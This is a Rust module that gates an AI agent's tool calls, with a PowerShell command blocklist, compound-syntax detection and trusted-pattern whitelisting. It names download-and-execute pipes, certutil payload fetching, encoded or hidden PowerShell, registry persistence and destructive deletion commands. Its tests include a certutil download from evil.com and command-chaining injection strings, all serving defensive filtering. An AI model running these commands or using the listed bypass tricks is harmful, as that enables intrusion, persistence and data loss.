use crate::config::TrustedPattern;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ApprovalLevel {
    AutoApprove,
    NeedsConfirmation,
    Blocked,
}

/// SAFETY NOTICE: The command filtering in this module is a **heuristic safety layer**
/// (speed-bump), NOT a security sandbox. PowerShell provides many obfuscation techniques
/// that can bypass simple string matching. For true sandboxing, consider running commands
/// in a restricted runspace or a lower-privilege process.

/// Extract the primary command name from a PowerShell command string.
fn extract_command_name(cmd: &str) -> String {
    let trimmed = cmd.trim();

    if trimmed.starts_with('$') {
        return trimmed.to_lowercase();
    }

    let first_segment = trimmed.split('|').next().unwrap_or(trimmed).trim();
    let first_cmd = first_segment
        .split(';')
        .next()
        .unwrap_or(first_segment)
        .trim();

    let tokens: Vec<&str> = first_cmd.split_whitespace().collect();
    let mut token_idx = 0;

    if let Some(first) = tokens.first() {
        if *first == "&" || *first == "." || *first == ".\\" || *first == "./" {
            token_idx = 1;
        }
    }

    if token_idx >= tokens.len() {
        return trimmed.to_lowercase();
    }

    let mut token = tokens[token_idx];

    // Strip leading call operator & if attached to the command name
    if token.starts_with('&') && token.len() > 1 {
        token = &token[1..];
    }

    // Strip surrounding quotes
    let token_trimmed = token.trim_matches(|c| c == '"' || c == '\'');

    let first_cmd_clean = token_trimmed
        .strip_prefix(".\\")
        .or_else(|| token_trimmed.strip_prefix("./"))
        .unwrap_or(token_trimmed);

    let name = if first_cmd_clean.contains('\\') || first_cmd_clean.contains('/') {
        first_cmd_clean
            .rsplit(|c| c == '\\' || c == '/')
            .next()
            .unwrap_or(first_cmd_clean)
    } else {
        first_cmd_clean
    };

    let name_trimmed = name.trim_matches(|c| c == '"' || c == '\'');
    let name_trimmed = name_trimmed
        .strip_suffix(".exe")
        .or_else(|| name_trimmed.strip_suffix(".ps1"))
        .or_else(|| name_trimmed.strip_suffix(".bat"))
        .or_else(|| name_trimmed.strip_suffix(".cmd"))
        .unwrap_or(name_trimmed);
    name_trimmed.to_lowercase()
}

/// Enhanced detection of compound syntax that could bypass whitelist matching.
/// Returns true if the command contains operators that allow chaining multiple commands.
fn has_compound_syntax(cmd: &str) -> bool {
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut prev_char = ' ';
    let chars: Vec<char> = cmd.chars().collect();

    for i in 0..chars.len() {
        let c = chars[i];

        // Track quote context
        if c == '\'' && !in_double_quote && prev_char != '\\' && prev_char != '`' {
            in_single_quote = !in_single_quote;
        } else if c == '"' && !in_single_quote && prev_char != '\\' && prev_char != '`' {
            in_double_quote = !in_double_quote;
        } else if !in_single_quote && !in_double_quote {
            // Semicolon: command chaining
            if c == ';' {
                return true;
            }

            // Newline/carriage return: statement separator
            if c == '\n' || c == '\r' {
                // Check if it's escaped
                if prev_char != '\\' && prev_char != '`' {
                    return true;
                }
            }

            // Pipe operator (| but not ||)
            if c == '|' {
                let next_is_pipe = i + 1 < chars.len() && chars[i + 1] == '|';
                let prev_is_pipe = i > 0 && chars[i - 1] == '|';
                if !next_is_pipe && !prev_is_pipe {
                    return true;
                }
            }

            // Backtick (PowerShell escape/continuation)
            if c == '`' {
                return true;
            }

            // Redirect operators: >, >>, 2>, 2>&1, <
            if c == '>' || c == '<' {
                // Allow only in paths like C:\>
                if i > 0 && (chars[i - 1] != '\\' && chars[i - 1] != '/') {
                    return true;
                }
            }

            // Subexpression $(...)
            if c == '$' && i + 1 < chars.len() && chars[i + 1] == '(' {
                return true;
            }

            // Array subexpression @(...)
            if c == '@' && i + 1 < chars.len() && chars[i + 1] == '(' {
                return true;
            }

            // Command substitution in single backticks (legacy)
            if c == '`' && i + 1 < chars.len() && chars[i + 1] != '`' {
                return true;
            }

            // Invoke-Expression patterns: IEX, Invoke-Expression
            let remaining = &cmd[i..];
            if remaining.to_lowercase().starts_with("iex ")
                || remaining.to_lowercase().starts_with("invoke-expression ")
            {
                return true;
            }

            // Script block invocation: & { ... }
            if c == '{' {
                // Check if preceded by & (with optional whitespace)
                let mut check_idx = i;
                while check_idx > 0 {
                    check_idx -= 1;
                    let prev = chars[check_idx];
                    if prev == '&' {
                        return true;
                    }
                    if prev != ' ' && prev != '\t' {
                        break;
                    }
                }
            }
        }

        prev_char = c;
    }

    false
}

/// Check if command contains dangerous variable usage that could bypass filters
fn has_dangerous_variable_usage(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();

    // Variable indirection patterns
    if cmd_lower.contains("$executioncontext") {
        return true;
    }

    // Get-Command followed by invocation
    if cmd_lower.contains("get-command")
        && (cmd_lower.contains("| &") || cmd_lower.contains(").invoke"))
    {
        return true;
    }

    // String building to bypass detection
    if cmd_lower.contains("-join") || cmd_lower.contains("-f ") {
        // Check if followed by execution
        if cmd_lower.contains("| iex") || cmd_lower.contains("| invoke-expression") {
            return true;
        }
    }

    false
}

fn command_has_arg(cmd: &str, names: &[&str]) -> bool {
    cmd.split_whitespace()
        .map(|part| part.trim_matches(|c| c == '"' || c == '\''))
        .any(|part| names.contains(&part))
}

fn is_powershell_command(cmd_name: &str) -> bool {
    matches!(cmd_name, "powershell" | "pwsh")
}

pub fn check_approval(
    tool_name: &str,
    args_str: &str,
    approval_policy: &str,
    trusted_patterns: &[TrustedPattern],
) -> ApprovalLevel {
    // 1. Check high-risk commands (blocklist as safety net)
    if is_high_risk(tool_name, args_str) {
        return ApprovalLevel::Blocked;
    }

    // 2. Read-only tools auto-approve
    let read_only = matches!(
        tool_name,
        "read_file" | "list_dir" | "web_search" | "grep" | "glob" | "todo_write"
    );
    if read_only {
        return ApprovalLevel::AutoApprove;
    }

    // 3. Check trusted patterns (whitelist)
    if is_trusted(tool_name, args_str, trusted_patterns) {
        return ApprovalLevel::AutoApprove;
    }

    // 4. Strict policy: everything except reads needs confirmation
    if approval_policy == "strict" {
        return ApprovalLevel::NeedsConfirmation;
    }

    // 5. Relaxed policy: only untrusted writes need confirmation
    if approval_policy == "relaxed" {
        if tool_name == "write_file"
            || tool_name == "edit_file"
            || tool_name == "execute_command"
            || tool_name == "run_python"
        {
            return ApprovalLevel::NeedsConfirmation;
        }
        return ApprovalLevel::AutoApprove;
    }

    // 6. Standard policy: writes and commands need confirmation
    ApprovalLevel::NeedsConfirmation
}

/// Check if a command is high-risk and should be blocked.
fn is_high_risk(tool_name: &str, args_str: &str) -> bool {
    if tool_name != "execute_command" {
        return false;
    }

    let args: serde_json::Value = match serde_json::from_str(args_str) {
        Ok(v) => v,
        Err(_) => return false,
    };
    let cmd = match args["command"].as_str() {
        Some(c) => c,
        None => return false,
    };

    let cmd_lower = cmd.to_lowercase();
    let cmd_lower = cmd_lower.replace('/', "\\");
    let cmd_trimmed = cmd_lower.trim();

    // Extract the primary command name
    let cmd_name = extract_command_name(cmd_trimmed);

    // === Absolutely blocked executables ===
    let blocked_executables = [
        "format-volume",
        "remove-partition",
        "diskpart",
        "mshta",
        "wscript",
        "cscript",
        "regsvr32",
        "mofcomp",
        "rundll32",
        "installutil",
        "regasm",
        "regsvcs",
    ];
    if blocked_executables.contains(&cmd_name.as_str()) {
        return true;
    }

    // === Dangerous PowerShell cmdlets ===
    let blocked_cmdlets = [
        "set-executionpolicy",
        "stop-process",
        "enable-psremoting",
        "disable-psremoting",
        "enter-pssession",
        "new-pssession",
        "remove-service",
    ];
    if blocked_cmdlets.contains(&cmd_name.as_str()) {
        return true;
    }

    // === Dangerous command patterns ===
    let blocked_patterns = [
        // System directory deletion
        "remove-item c:\\windows",
        "del c:\\windows",
        "rm c:\\windows",
        "remove-item \"c:\\windows",
        "remove-item 'c:\\windows",
        "remove-item c:\\program files",
        "del c:\\program files",
        "rm c:\\program files",
        // Recursive force deletion
        "remove-item -recurse -force c:\\",
        "remove-item -r -force c:\\",
        // Account deletion
        "net user * /delete",
        "net user /delete",
        "remove-localuser",
        // Registry persistence / machine-wide modification
        "reg add hklm",
        "reg delete hklm",
        "set-itemproperty hklm:",
        "new-itemproperty hklm:",
        "remove-itemproperty hklm:",
        "set-itemproperty hkcu:\\software\\microsoft\\windows\\currentversion\\run",
        // Remote execution
        "curl | sh",
        "curl | bash",
        "curl|sh",
        "curl|bash",
        "wget | sh",
        "wget | bash",
        "irm | iex",
        "irm|iex",
        "iwr | iex",
        "iwr|iex",
        "invoke-restmethod | invoke-expression",
        "invoke-webrequest | invoke-expression",
        "| iex",
        "| invoke-expression",
        // certutil is useful for hashes, but these modes are execution/download helpers.
        "certutil -urlcache",
        "certutil.exe -urlcache",
        "certutil -decode",
        "certutil.exe -decode",
        // Catastrophic commands
        "rm -rf /",
        "rm -rf c:\\",
        "format c:",
        // Dangerous redirects
        "> c:\\windows",
        "> c:\\program files",
        // Reflective loading
        "[reflection.assembly]::load",
        "[system.reflection.assembly]::load",
    ];

    for pattern in &blocked_patterns {
        if cmd_trimmed.contains(pattern) {
            return true;
        }
    }

    if is_powershell_command(&cmd_name) {
        if command_has_arg(cmd_trimmed, &["-enc", "-encodedcommand", "-e"]) {
            return true;
        }
        if command_has_arg(cmd_trimmed, &["-w", "-windowstyle"]) && cmd_trimmed.contains("hidden") {
            return true;
        }
        if cmd_trimmed.contains("-noninteractive -nop")
            || cmd_trimmed.contains("-nop -noninteractive")
        {
            return true;
        }
    }

    if (cmd_trimmed.contains("[convert]::frombase64string")
        || cmd_trimmed.contains("[text.encoding]::utf8.getstring"))
        && (cmd_trimmed.contains(" iex") || cmd_trimmed.contains("invoke-expression"))
    {
        return true;
    }

    // Block invoke-expression
    if cmd_name == "invoke-expression" || cmd_name == "iex" {
        return true;
    }

    false
}

/// Check if a tool call matches a trusted pattern (whitelist).
fn is_trusted(tool_name: &str, args_str: &str, patterns: &[TrustedPattern]) -> bool {
    for p in patterns {
        if p.tool_name != tool_name {
            continue;
        }

        match tool_name {
            "execute_command" => {
                if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
                    if let Some(cmd) = args["command"].as_str() {
                        let cmd_trimmed = cmd.trim();
                        let pattern_trimmed = p.pattern.trim();

                        // CRITICAL: Block any compound syntax from auto-approval
                        if has_compound_syntax(cmd_trimmed) {
                            continue;
                        }

                        // CRITICAL: Block dangerous variable usage
                        if has_dangerous_variable_usage(cmd_trimmed) {
                            continue;
                        }

                        // Exact match only for trusted patterns
                        let cmd_lower = cmd_trimmed.to_lowercase();
                        let pattern_lower = pattern_trimmed.to_lowercase();

                        // Allow prefix match only if no arguments follow
                        if cmd_lower == pattern_lower {
                            return true;
                        }

                        // Environment variable reads use PowerShell's $env:NAME syntax.
                        if pattern_lower.ends_with(':') && cmd_lower.starts_with(&pattern_lower) {
                            let remainder = &cmd_lower[pattern_lower.len()..];
                            // SECURITY: Ensure no compound syntax after env var
                            if remainder.contains(';')
                                || remainder.contains('|')
                                || remainder.contains('&')
                            {
                                continue;
                            }
                            return true;
                        }

                        // For patterns with arguments, require exact prefix + space
                        if cmd_lower.starts_with(&pattern_lower) {
                            let remainder = &cmd_lower[pattern_lower.len()..];
                            // Must be followed by whitespace or nothing
                            if remainder.is_empty() || remainder.starts_with(' ') {
                                return true;
                            }
                        }

                        // Also match by extracted command name for simple commands
                        let cmd_name = extract_command_name(cmd_trimmed);
                        let pattern_name = extract_command_name(pattern_trimmed);
                        if cmd_name == pattern_name && !cmd_trimmed.contains(' ') {
                            return true;
                        }
                    }
                }
            }
            "write_file" => {
                if let Ok(args) = serde_json::from_str::<serde_json::Value>(args_str) {
                    if let Some(path) = args["path"].as_str() {
                        if path.to_lowercase().starts_with(&p.pattern.to_lowercase()) {
                            return true;
                        }
                    }
                }
            }
            "run_python" => {
                if p.pattern == "*" || p.pattern == "run_python" {
                    return true;
                }
            }
            _ => {}
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_command_name() {
        assert_eq!(extract_command_name("Get-ChildItem"), "get-childitem");
        assert_eq!(extract_command_name("git status"), "git");
        assert_eq!(extract_command_name("npm list --depth=0"), "npm");
        assert_eq!(
            extract_command_name("C:\\Python\\python.exe script.py"),
            "python"
        );
        assert_eq!(extract_command_name(".\\build.ps1"), "build");
        assert_eq!(extract_command_name("echo hello | Out-File"), "echo");
        assert_eq!(extract_command_name("dir; Remove-Item x"), "dir");
        assert_eq!(extract_command_name("&certutil -urlcache"), "certutil");
        assert_eq!(extract_command_name("&\"certutil\" -urlcache"), "certutil");
        assert_eq!(extract_command_name("& \"certutil\" -urlcache"), "certutil");
    }

    #[test]
    fn test_compound_syntax_detection() {
        assert!(has_compound_syntax("git status; rm file.txt"));
        assert!(has_compound_syntax("echo test | Out-File"));
        assert!(has_compound_syntax("ls `\n rm x"));
        assert!(has_compound_syntax("$cmd = 'Remove-Item'; & $cmd"));
        assert!(has_compound_syntax("echo $(Get-Date)"));
        assert!(has_compound_syntax("& { Remove-Item x }"));
        assert!(!has_compound_syntax("git status"));
        assert!(!has_compound_syntax("echo 'test;test'"));
    }

    #[test]
    fn test_high_risk_blocked() {
        let args = serde_json::json!({"command": "Set-ExecutionPolicy Unrestricted"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "certutil -urlcache -split -f http://evil.com/payload.exe"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "powershell -enc abc123"}).to_string();
        assert!(is_high_risk("execute_command", &args));

        // This command contains compound syntax (& operator) so it should be caught by has_compound_syntax
        // when used in whitelist matching, but here we're testing direct high-risk detection
        let args = serde_json::json!({"command": "Invoke-Expression 'Remove-Item x'"}).to_string();
        assert!(is_high_risk("execute_command", &args));
    }

    #[test]
    fn test_safe_commands_not_blocked() {
        let args = serde_json::json!({"command": "Get-ChildItem"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "git status"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "npm list"}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "node -e \"console.log(1)\""}).to_string();
        assert!(!is_high_risk("execute_command", &args));

        let args = serde_json::json!({"command": "Add-Type -AssemblyName System.Web"}).to_string();
        assert!(!is_high_risk("execute_command", &args));
    }

    #[test]
    fn test_trusted_pattern_bypass_prevention() {
        let patterns = vec![TrustedPattern {
            tool_name: "execute_command".into(),
            pattern: "git status".into(),
            created_at: 0,
        }];

        // Should match exact command
        let args = serde_json::json!({"command": "git status"}).to_string();
        assert!(is_trusted("execute_command", &args, &patterns));

        // Should NOT match with compound syntax
        let args = serde_json::json!({"command": "git status; rm sensitive.txt"}).to_string();
        assert!(!is_trusted("execute_command", &args, &patterns));

        let args =
            serde_json::json!({"command": "git status | Select-Object -First 1; Remove-Item x"})
                .to_string();
        assert!(!is_trusted("execute_command", &args, &patterns));
    }

    #[test]
    fn test_environment_variable_prefix_trust() {
        let patterns = vec![TrustedPattern {
            tool_name: "execute_command".into(),
            pattern: "$env:".into(),
            created_at: 0,
        }];

        let args = serde_json::json!({"command": "$env:Path"}).to_string();
        assert!(is_trusted("execute_command", &args, &patterns));
    }
}
